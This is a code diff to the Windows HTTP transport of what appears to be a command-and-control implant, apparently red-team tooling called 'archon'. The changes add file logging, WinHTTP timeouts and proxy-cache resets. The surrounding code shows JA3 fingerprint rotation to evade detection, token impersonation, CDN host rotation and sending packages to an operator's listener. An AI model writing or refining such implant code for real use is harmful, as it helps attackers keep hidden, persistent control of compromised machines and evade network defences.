@@ -16,10 +16,15 @@
 #undef HTTP_HELPER_SWPRINTF
 
 #ifdef ARCHON_HTTP_LOG
-/* Write a one-line ASCII diagnostic to C:\Windows\Temp\archon-http.txt.
+/* Write a one-line ASCII diagnostic to .\archon-http.txt under the current
+ * directory first (typically the Task Scheduler startup directory / deploy folder),
+ * else fall back to C:\\Temp\\archon-http.txt.  Low-priv Lab accounts may be
+ * unable to create files alongside unrelated paths under C:\\Temp.
+ *
  * Msg must be a NUL-terminated ASCII string; ErrCode is appended as decimal.
  * Uses CreateFileW/WriteFile/NtClose via the Win32 dispatch table so it works
- * in any execution context without libc.  No-op on I/O failure.            */
+ * in any execution context without libc.  No-op on I/O failure.
+ */
 static void HttpWriteDebugLog( LPCSTR Msg, DWORD ErrCode ) {
     HANDLE hFile;
     DWORD  Written;
@@ -29,6 +34,10 @@ static void HttpWriteDebugLog( LPCSTR Msg, DWORD ErrCode ) {
     DWORD  tmp;
     int    digits[ 10 ];
     int    ndigs = 0;
+    WCHAR  CwdBuf[ MAX_PATH + 16 ] = { 0 };
+    WCHAR  LogPath[ MAX_PATH + 32 ] = { 0 };
+    LPCWSTR TargetPath      = L"C:\\Temp\\archon-http.txt";
+    BOOL    LogPathPrepared = FALSE;
 
     while ( Msg[ MsgLen ] && MsgLen < 220 ) {
         Buf[ MsgLen ] = Msg[ MsgLen ];
@@ -53,8 +62,23 @@ static void HttpWriteDebugLog( LPCSTR Msg, DWORD ErrCode ) {
     }
     Buf[ MsgLen++ ] = '\n';
 
+    if (
+        Instance->Win32.GetCurrentDirectoryW &&
+        Instance->Win32.GetCurrentDirectoryW( MAX_PATH + 15, CwdBuf ) > 0 &&
+        Instance->Win32.swprintf_s &&
+        Instance->Win32.swprintf_s(
+             LogPath,
+             sizeof( LogPath ) / sizeof( LogPath[ 0 ] ),
+             L"%ls\\archon-http.txt",
+             CwdBuf ) > 0
+    )
+    {
+        TargetPath       = LogPath;
+        LogPathPrepared = TRUE;
+    }
+
     hFile = Instance->Win32.CreateFileW(
-        L"C:\\Windows\\Temp\\archon-http.txt",
+        TargetPath,
         FILE_APPEND_DATA,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         NULL,
@@ -62,6 +86,18 @@ static void HttpWriteDebugLog( LPCSTR Msg, DWORD ErrCode ) {
         FILE_ATTRIBUTE_NORMAL,
         NULL
     );
+    /* If cwd-relative path rejected, retry the coarse C:\\Temp fall-back exactly once. */
+    if ( LogPathPrepared && ( ! hFile || hFile == INVALID_HANDLE_VALUE ) ) {
+        hFile = Instance->Win32.CreateFileW(
+            L"C:\\Temp\\archon-http.txt",
+            FILE_APPEND_DATA,
+            FILE_SHARE_READ | FILE_SHARE_WRITE,
+            NULL,
+            OPEN_ALWAYS,
+            FILE_ATTRIBUTE_NORMAL,
+            NULL
+        );
+    }
     if ( hFile && hFile != INVALID_HANDLE_VALUE ) {
         Instance->Win32.WriteFile( hFile, Buf, (DWORD)MsgLen, &Written, NULL );
         SysNtClose( hFile );
@@ -220,6 +256,7 @@ BOOL HttpSend(
 
     /* we might impersonate a token that lets WinHttpOpen return an Error 5 (ERROR_ACCESS_DENIED) */
     TokenImpersonate( FALSE );
+    HTTP_LOG( "HttpSend enter" );
 
     /* ARC-06: rotate TLS fingerprint before each HTTPS connection so every
      * session produces a different JA3 hash. */
@@ -253,11 +290,18 @@ BOOL HttpSend(
         }
         HTTP_LOG( "WinHttpOpen OK" );
 
-        /* Set a bounded connect timeout so WinHttpSendRequest does not block
-         * indefinitely on unreachable hosts or stalled proxy auto-detection.
-         * 15 s is long enough for lab/WAN use but short enough that the retry
-         * loop can cycle multiple times within the 60 s check-in window. */
-        {
+        /* Resolve/connect/send/receive caps (ms).  WinHttp docs recommend
+         * WinHttpSetTimeouts after WinHttpOpen; connect-only SetOption is not
+         * always enough for internal proxy/WPAD phases (red-cell-c2-vudj9). */
+        if ( Instance->Win32.WinHttpSetTimeouts ) {
+            Instance->Win32.WinHttpSetTimeouts(
+                Instance->hHttpSession,
+                15000,
+                15000,
+                15000,
+                15000
+            );
+        } else {
             DWORD ConnTimeoutMs = 15000;
             Instance->Win32.WinHttpSetOption(
                 Instance->hHttpSession,
@@ -266,6 +310,10 @@ BOOL HttpSend(
                 sizeof( DWORD )
             );
         }
+
+        /* Note: avoid WinHttpResetAutoProxy here — MS docs note complex flag
+         * requirements (often OUT_OF_PROC) and interaction with session handles;
+         * mis-calls can appear to succeed while doing nothing (vudj9 autotest). */
 
         /* ARC-06: apply the randomly chosen TLS protocol-version set to the
          * fresh session so Schannel advertises a different cipher-suite list
@@ -393,7 +441,14 @@ BOOL HttpSend(
         BOOL       SkipAutoPx = ConnHost && HttpHostSkipsWinHttpAutoproxy( ConnHost );
 
         if ( SkipAutoPx ) {
-            /* Direct connect; avoids WinHttpGetProxyForUrl / PAC stalls on literal IPs (red-cell-c2-vudj9). */
+            /* Direct connect; avoids WinHttpGetProxyForUrl / PAC stalls on literal IPs (red-cell-c2-vudj9).
+             * Drop any stale cached proxy from HostRotation/JA3 rollover — Literal-IP transports must never
+             * inherit a WPAD-derived WINHTTP_PROXY_INFO from another host. */
+            if ( Instance->ProxyForUrl ) {
+                Instance->Win32.LocalFree( Instance->ProxyForUrl );
+                Instance->ProxyForUrl       = NULL;
+                Instance->SizeOfProxyForUrl = 0;
+            }
             Instance->LookedForProxy = TRUE;
         } else {
             WCHAR  UrlForWinHttpProxy[ 1024 ];
@@ -501,22 +556,36 @@ BOOL HttpSend(
         }
     }
 
-    if ( Instance->ProxyForUrl ) {
-        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
-            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+    {
+        PHOST_DATA ReqHostData = Instance->Config.Transport.Host;
+        LPCWSTR    ReqHostName  = ( ReqHostData && ReqHostData->Host ) ? ReqHostData->Host : NULL;
+        BOOL       ReqLiteral   = ReqHostName && HttpHostSkipsWinHttpAutoproxy( ReqHostName );
+
+        if ( ReqLiteral && Instance->ProxyForUrl ) {
+            Instance->Win32.LocalFree( Instance->ProxyForUrl );
+            Instance->ProxyForUrl       = NULL;
+            Instance->SizeOfProxyForUrl = 0;
         }
-    } else if ( ! Instance->Config.Transport.Proxy.Enabled ) {
-        /* Explicitly set WINHTTP_ACCESS_TYPE_NO_PROXY on this request handle.
-         * The session was opened with NO_PROXY, but WinHTTP may still perform
-         * internal WPAD/PAC auto-detection on the first WinHttpSendRequest when
-         * the system has "Automatically detect settings" enabled.  A per-request
-         * NO_PROXY override prevents that pre-TCP blocking (red-cell-c2-vudj9). */
-        WINHTTP_PROXY_INFO DirectProxy = { 0 };
-        DirectProxy.dwAccessType    = WINHTTP_ACCESS_TYPE_NO_PROXY;
-        DirectProxy.lpszProxy       = WINHTTP_NO_PROXY_NAME;
-        DirectProxy.lpszProxyBypass = WINHTTP_NO_PROXY_BYPASS;
-        HTTP_LOG( "set request NO_PROXY" );
-        Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &DirectProxy, sizeof( WINHTTP_PROXY_INFO ) );
+
+        if ( Instance->ProxyForUrl && ! ReqLiteral ) {
+            if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
+                PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+            }
+        } else if ( ! Instance->Config.Transport.Proxy.Enabled ) {
+            /* Explicitly set WINHTTP_ACCESS_TYPE_NO_PROXY on this request handle.
+             * The session was opened with NO_PROXY, but WinHTTP may still perform
+             * internal WPAD/PAC auto-detection on the first WinHttpSendRequest when
+             * the system has "Automatically detect settings" enabled.  A per-request
+             * NO_PROXY override prevents that pre-TCP blocking (red-cell-c2-vudj9). */
+            WINHTTP_PROXY_INFO DirectProxy = { 0 };
+            DirectProxy.dwAccessType    = WINHTTP_ACCESS_TYPE_NO_PROXY;
+            DirectProxy.lpszProxy       = WINHTTP_NO_PROXY_NAME;
+            DirectProxy.lpszProxyBypass = WINHTTP_NO_PROXY_BYPASS;
+            HTTP_LOG( "set request NO_PROXY" );
+            if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &DirectProxy, sizeof( WINHTTP_PROXY_INFO ) ) ) {
+                HTTP_LOG( "set request NO_PROXY FAILED" );
+            }
+        }
     }
 
     /* Send package to our listener */
@@ -733,9 +802,18 @@ PHOST_DATA HostRotation( SHORT Strategy )
     {
         /*
          * Different CDNs can have different WPAD rules.
-         * After rotating, look for the proxy again
+         * After rotating, look for the proxy again.
+         *
+         * Also drop any cached ProxyForUrl — HostFailure() only resets LookedForProxy;
+         * without freeing, the next literal-IP hop could wrongly reuse the prior host's
+         * WPAD-derived proxy config (red-cell-c2-vudj9).
          */
         Instance->LookedForProxy = FALSE;
+        if ( Instance->ProxyForUrl ) {
+            Instance->Win32.LocalFree( Instance->ProxyForUrl );
+            Instance->ProxyForUrl       = NULL;
+            Instance->SizeOfProxyForUrl = 0;
+        }
     }
 
     if ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
